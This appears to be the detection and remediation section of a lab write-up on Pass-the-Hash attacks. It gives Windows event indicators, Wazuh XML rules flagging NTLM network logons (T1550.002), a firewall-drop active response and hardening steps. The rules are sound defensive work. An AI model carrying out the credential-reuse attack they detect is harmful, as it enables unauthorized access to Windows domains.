## Detection
| Source | Event ID | Indicator |
|---|---|---|
| Windows Security Log | 4624 | NTLM Logon Type 3 — svc-mssql from Kali IP |
| Wazuh Rule 100020 | level 14 | NTLM Network Logon — possible PtH |
| Wazuh Rule 100021 | level 15 | CRITICAL: Repeated NTLM logons |
| Wazuh Built-in 92652 | level 6 | Pass the Hash — T1550.002 |

## Wazuh Detection Rules
```xml
<!-- Pass-the-Hash Detection -->
<rule id="100020" level="14">
  <if_group>windows</if_group>
  <field name="win.system.eventID">4624</field>
  <field name="win.eventdata.logonType">3</field>
  <field name="win.eventdata.authenticationPackageName">NTLM</field>
  <description>NTLM Network Logon — possible Pass-the-Hash (T1550.002)</description>
  <mitre><id>T1550.002</id></mitre>
</rule>

<!-- Repeated PtH — CRITICAL -->
<rule id="100021" level="15" frequency="3" timeframe="60">
  <if_matched_sid>100020</if_matched_sid>
  <description>CRITICAL: Repeated NTLM logons — Pass-the-Hash attack confirmed</description>
  <mitre><id>T1550.002</id></mitre>
</rule>
```

## Active Response
Wazuh is configured to automatically block the attacker IP via `firewall-drop` 
when rule 100020 or 100021 triggers — isolating the compromised source within seconds.
```xml
<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>100020,100021</rules_id>
  <timeout>300</timeout>
</active-response>
```

## Remediation
| Action | Priority |
|---|---|
| Enable Protected Users Security Group | HIGH |
| Disable NTLM authentication domain-wide | HIGH |
| Implement LAPS for local admin accounts | HIGH |
| Enable Windows Defender Credential Guard | MEDIUM |
| Monitor Event ID 4624 Logon Type 3 from external IPs | MEDIUM |
